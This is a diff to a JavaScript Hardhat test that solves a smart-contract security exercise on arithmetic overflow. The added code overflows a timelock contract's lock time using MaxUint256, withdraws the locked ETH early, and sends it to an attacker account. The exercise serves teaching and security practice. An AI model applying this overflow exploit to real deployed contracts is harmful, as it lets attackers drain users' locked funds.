@@ -20,7 +20,7 @@ describe('Arithmetic Over/Underflow Exercise 1', function () {
         );
 
         this.timelock = await TimeLockFactory.deploy();
-        
+
         await this.timelock.connect(victim).depositETH({ value: VICTIM_DEPOSIT });
         let currentBalance = await ethers.provider.getBalance(victim.address);
         expect(currentBalance).to.be.lt(this.victimInitialBalance.sub(VICTIM_DEPOSIT))
@@ -35,13 +35,40 @@ describe('Arithmetic Over/Underflow Exercise 1', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR SOLUTION HERE */
-        
+      /** CODE YOUR SOLUTION HERE */
+
+
+      _currentTimeLock = await this.timelock.getLocktime(victim.address);
+      let overFlowAmount = ethers.constants.MaxUint256.add(1).sub(_currentTimeLock)
+
+      await expect(
+        this.timelock.connect(victim).withdrawETH()
+      ).to.be.reverted
+
+
+      await this.timelock.connect(victim).increaseMyLockTime(overFlowAmount);
+
+      _hackedTimeLock  = await this.timelock.getLocktime(victim.address);
+
+      const blockNumBefore = await ethers.provider.getBlockNumber();
+      const blockBefore = await ethers.provider.getBlock(blockNumBefore);
+      const currentTimestamp = blockBefore.timestamp;
+
+      await this.timelock.connect(victim).withdrawETH();
+
+      let sourcedBalance = await this.timelock.getBalance(victim.address)
+      expect(await this.timelock.getBalance(victim.address)).to.be.equal('0');
+
+      await victim.sendTransaction({
+        to: attacker.address,
+        value: VICTIM_DEPOSIT
+      })
+
     });
 
     after(async function () {
         /** SUCCESS CONDITIONS */
-        
+
         // Timelock contract victim's balance supposed to be 0 (withdrawn successfuly)
         let victimDepositedAfter = await this.timelock.connect(victim).getBalance(victim.address);
         expect(victimDepositedAfter).to.equal(0);
@@ -53,3 +80,4 @@ describe('Arithmetic Over/Underflow Exercise 1', function () {
         );
     });
 });
+
